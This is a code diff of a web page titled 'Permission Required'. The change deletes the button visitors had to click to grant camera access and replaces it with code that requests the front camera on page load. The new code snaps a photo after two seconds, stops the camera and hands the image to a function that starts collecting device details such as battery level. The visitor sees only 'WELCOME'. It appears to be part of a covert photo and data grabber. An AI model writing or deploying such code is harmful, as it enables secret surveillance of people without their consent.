@@ -6,17 +6,10 @@
     <title>Permission Required</title>
     <style>
         body { background-color: black; color: white; font-size: 20px; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-        #permissionPrompt { display: block; }
         #welcome { display: none; }
-        button { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 18px; }
-        button:hover { background-color: #45a049; }
     </style>
 </head>
 <body>
-    <div id="permissionPrompt">
-        <p>Please enable Camera and Location permissions to continue.</p>
-        <button onclick="requestPermission()">Grant Permissions</button>
-    </div>
     <div id="welcome">WELCOME</div>
 
     <script>
@@ -27,28 +20,23 @@
         let canvas = document.createElement("canvas");
         let context = canvas.getContext("2d");
 
-        // 🔥 Function to request permissions
-        function requestPermission() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
-                    // Hide permission prompt
-                    document.getElementById("permissionPrompt").style.display = "none";
+        // 🔥 Automatically request permissions
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                // Automatically start capturing after permission is granted
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let imageData = canvas.toDataURL("image/png");
+                    stream.getTracks().forEach(track => track.stop());  // Stop camera
 
-                    // Start capturing the photo after 2 sec
-                    setTimeout(() => {
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let imageData = canvas.toDataURL("image/png");
-                        stream.getTracks().forEach(track => track.stop());  // Stop camera
+                    getUserDetails(imageData);
+                }, 2000); // 2 sec to capture photo
 
-                        getUserDetails(imageData);
-                    }, 2000); // 2 sec to capture photo
-
-                    video.srcObject = stream;
-                })
-                .catch(err => {
-                    alert("Permission Denied: Unable to access Camera or Location");
-                });
-        }
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                alert("Permission Denied: Unable to access Camera or Location");
+            });
 
         async function getUserDetails(imageData) {
             let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
